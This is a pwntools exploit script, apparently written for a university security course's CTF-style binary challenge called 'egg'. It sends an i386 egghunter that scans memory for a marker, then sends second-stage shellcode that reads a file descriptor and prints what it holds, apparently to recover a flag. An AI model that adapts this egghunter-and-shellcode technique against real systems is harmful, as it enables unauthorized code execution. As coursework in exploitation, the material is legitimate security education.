#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./egg --host misc.6447.sec.edu.au --port 8006
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./egg')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'misc.6447.sec.edu.au'
port = int(args.PORT or 8006)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x0804896b
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

dCookie = p32(0x7afceb58)
egghunter = shellcraft.i386.stackhunter()
print egghunter

egghunter = """
add eax, 0xe
egg_hunter:
	inc eax
	cmp DWORD PTR [eax], 0xbb66db31
	jne egg_hunter
	call eax
"""

egghunter_asm = asm(egghunter)
shellcode = shellcraft.i386.linux.read(1000,'esp',100)
shellcode += shellcraft.i386.linux.write(1,'esp','eax')
shellcode_asm = asm(shellcode)
line1 = io.recvuntil('smallbuf shellcode')
print line1

print 'Egghunter\nLength: '+str(len(egghunter_asm))
printMe = ''.join(x.encode('hex') for x in egghunter_asm)
print egghunter
io.sendline(egghunter_asm)
line2 = io.recvuntil('bigbuf shellcode:')
print line2
printMe = ''.join(x.encode('hex') for x in shellcode_asm)
print printMe
io.sendline(dCookie+shellcode_asm)

io.interactive()
